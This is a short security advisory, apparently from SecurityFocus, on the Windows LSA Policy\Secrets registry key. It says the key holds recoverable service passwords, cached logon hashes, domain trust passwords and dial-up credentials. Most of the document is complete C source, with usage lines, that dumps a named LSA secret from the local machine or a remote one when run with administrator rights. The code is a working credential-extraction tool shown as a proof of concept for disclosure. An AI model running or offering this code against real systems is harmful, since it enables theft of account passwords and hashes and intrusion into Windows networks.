source: http://www.securityfocus.com/bid/231/info


The HKeyLocalMachine\SECURITY\Policy\Secrets\ key contains obfuscated data for various system services/resources. Clear-text usernames and passwords for services running under the context of a user account, password hashes and usernames for the last ten users to log on to the domain from the local host, domain trust passwords, passwords for web and ftp services, and dial-up networking usernames, passwords and phone numbers can be obtained and "decrypted" from the Policy\Secrets key. 

Must be run with administrative privileges

run as: prog _sc_schedule [machine], prog nl$1, prog w3_root_data
or any other registry key under NTLM\security\policy\secrets.

<---begin--->
#include <windows.h>
#include <stdio.h>

#include "ntsecapi.h"
#define AST(x) if (!(x)) {printf("Failed line %d\n", __LINE__);exit(1);} else
void write();

PLSA_UNICODE_STRING
str(LPWSTR x)
{
static LSA_UNICODE_STRING s;

s.Buffer=x;
s.Length=wcslen(x)*sizeof(WCHAR);
s.MaximumLength = (wcslen(x)+1)*2;
return &s;
}

int _cdecl
main(int argc, char *argv[])
{
LSA_HANDLE pol;
PLSA_UNICODE_STRING foo;
LSA_OBJECT_ATTRIBUTES attrs;
WCHAR keyname[256]=L"";
WCHAR host[256]=L"";

wsprintfW(keyname, L"%hS", argv[1]);
if(argc == 3) wsprintfW(host, L"%hS", argv[2]);
memset(&attrs, 0, sizeof(attrs));
AST(!LsaOpenPolicy(str(host), &attrs, 0, &pol));
AST(!LsaRetrievePrivateData(pol, str(keyname), &foo));
write(1, foo->Buffer, foo->Length);
LsaClose(pol);
exit(0);
}
<---end---> 